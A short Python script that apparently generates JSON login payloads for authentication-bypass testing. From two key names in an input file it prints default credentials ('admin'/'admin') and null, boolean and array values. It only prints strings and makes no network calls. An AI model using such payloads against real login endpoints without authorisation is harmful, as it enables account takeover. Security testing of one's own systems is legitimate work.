import sys
from string import Template
import json


# default credential
def method1(args):
    payload = f'"{args.key1}": "admin","{args.key2}": "admin"'
    print(template.substitute(payload=payload))

# using null as value without number 1 value
def method2(args):
    payload = f'"{args.key1}": null,"{args.key2}": null'
    print(template.substitute(payload=payload))

def method3(args):
    payload = f'"{args.key1}": "{args.input1}","{args.key2}": null'
    print(template.substitute(payload=payload))

def method4(args):
    payload = f'"{args.key1}": "{args.input1}","{args.key2}": true'
    print(template.substitute(payload=payload))

def method5(args):
    payload = f'"{args.key1}": "{args.input1}","{args.key2}": ["{args.input2}"]'
    print(template.substitute(payload=payload))

def method6(args):
    payload = f'"{args.key1}": "{args.input1}","{args.key2}": false'
    print(template.substitute(payload=payload))



if __name__ == "__main__":

    with open('input.json', 'r') as f:
        data = json.load(f)

    class Argument:
        def __init__(self):
            self.key1 = data["key1"]
            self.key2 = data["key2"]
            self.input1 = data["value_key1"]
            self.input2 = data["value_key1_2"]
            self.input3 = data["value_key2"]
            self.input4 = data["value_key2_2"]
    
    args = Argument()
    bracket = False
    # bracket = sys.argv[5]

    if bracket == True:
        template = Template("{$payload}")
    else:
        template = Template("$payload")
    
    method1(args)
    method2(args)
    method3(args)
    method4(args)